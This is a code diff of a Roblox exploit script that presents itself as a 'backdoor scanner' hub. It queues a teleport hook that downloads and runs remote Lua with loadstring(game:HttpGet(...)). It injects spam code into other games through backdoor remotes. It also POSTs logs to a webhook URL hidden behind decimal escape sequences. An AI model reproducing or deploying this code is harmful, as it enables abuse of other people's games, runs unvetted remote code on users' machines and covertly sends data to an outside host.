@@ -1408,7 +1408,7 @@ local function C_20()
 local script = G2L["20"];
 	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or request
     if queueteleport then
-        queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/its-Dumb0xd/Backdoor/main/Main.lua'))()")
+        queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/its-Dumb0xd/Backdoor/main/Backdoor-Scanner/scanner.lua'))()")
     end
 
 	GUI=script.Parent.Frame
@@ -1564,7 +1564,7 @@ local script = G2L["20"];
 					runRemote(remote, "a=Instance.new('Hint')a.Text='Dumb0 Hub Backdoor | https://discord.gg/4CvKpYVJ4c | Free and FASTEST and EASIEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
+					if request and not _G.Dumb0_Hub_Backdoor_Logs_Disabled then 
 						request({
 							Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\53\48\52\50\50\55\49\57\53\51\48\50\57\54\57\52\51\53\47\101\99\108\105\88\102\90\89\45\56\74\86\120\72\77\104\108\82\107\100\77\80\45\115\106\119\79\97\103\69\54\57\111\115\68\71\90\85\82\74\116\84\87\84\104\50\117\66\116\54\105\113\75\120\68\116\98\112\48\82\87\66\115\78\112\95\69\103',
                             Method = 'POST',
